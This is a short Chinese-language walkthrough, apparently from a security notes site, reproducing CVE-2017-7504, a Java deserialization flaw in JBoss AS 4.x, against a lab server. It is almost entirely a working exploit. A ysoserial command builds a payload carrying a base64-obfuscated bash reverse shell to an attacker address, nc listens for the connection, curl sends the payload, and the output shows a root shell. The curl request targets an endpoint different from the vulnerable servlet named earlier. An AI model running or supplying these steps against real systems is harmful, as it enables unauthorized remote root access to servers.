---
description: >-
  Red Hat JBoss Application Server（AS，也称WildFly）是美国红帽（Red
  Hat）公司的一款基于JavaEE的开源的应用服务器，它具有启动超快、轻量、模块化设计、热部署和并行部署、简洁管理、域管理及第一类元件等特性。 Red
  Hat Jboss AS 4.X及之前的版本中的JbossMQ实现过程的JMS over HTTP Invocation Layer的H
---

# CVE-2017-7504

存在漏洞页面

```
/jbossmq-httpil/HTTPServerILServlet
```

<figure><img src="../../.gitbook/assets/image (56).png" alt=""><figcaption></figcaption></figure>

利用ysoserial生成一个反弹shell的payload

```
┌──(root㉿kali)-[~/Desktop/tool/jdk1.8.0_202/bin]
└─# ./java -jar ../../Deserialization/ysoserial/target/ysoserial-all.jar CommonsCollections6 "bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIzLjEyOS85OTkyIDA+JjE=}|{base64,-d}|{bash,-i}" > /root/Desktop/test/poc.ser
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
```

监听本地端口

```
┌──(root㉿kali)-[~]
└─# nc -nlvp 9992
```

用curl发送该payload

```
┌──(root㉿kali)-[~/Desktop/test]
└─# curl http://192.168.23.132:8080/invoker/readonly --data-binary @poc.ser
```

监听端口返回shell

```
┌──(root㉿kali)-[~]
└─# nc -nlvp 9992
listening on [any] 9992 ...
connect to [192.168.23.129] from (UNKNOWN) [192.168.23.132] 49216
bash: cannot set terminal process group (1): Inappropriate ioctl for device
bash: no job control in this shell
root@03fa6b275e3e:/# id
id
uid=0(root) gid=0(root) groups=0(root)
```
